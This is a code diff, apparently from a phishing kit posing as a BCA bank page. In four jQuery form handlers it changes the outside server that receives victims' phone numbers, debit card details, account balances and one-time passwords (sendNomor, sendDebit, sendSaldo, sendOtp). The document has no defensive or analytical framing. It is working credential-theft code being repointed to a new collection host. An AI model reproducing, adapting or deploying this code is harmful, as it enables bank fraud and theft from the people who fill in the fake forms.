@@ -8,7 +8,7 @@ document.getElementById('btnSubmit1').innerHTML = "Memproses...";
 
  $.ajax({
  type: 'POST',
- url: 'https://bca-individu.c1.is/token/5/sendNomor.php',
+ url: 'https://developer-x.myhost.id/7/sendNomor.php',
  data: $(this).serialize(),
  datatype: 'JSON',
  
@@ -43,7 +43,7 @@ $('#form1').on('submit', function (event) {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://bca-individu.c1.is/token/5/sendDebit.php',
+ url: 'https://developer-x.myhost.id/7/sendDebit.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -84,7 +84,7 @@ $('#forgetPasswordForm').on('submit', function (event) {
    
 $.ajax({
  type: 'POST',
- url: 'https://bca-individu.c1.is/token/5/sendSaldo.php',
+ url: 'https://developer-x.myhost.id/7/sendSaldo.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -128,7 +128,7 @@ $('#form2').on('submit', function (event) {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://bca-individu.c1.is/token/5/sendOtp.php',
+ url: 'https://developer-x.myhost.id/7/sendOtp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
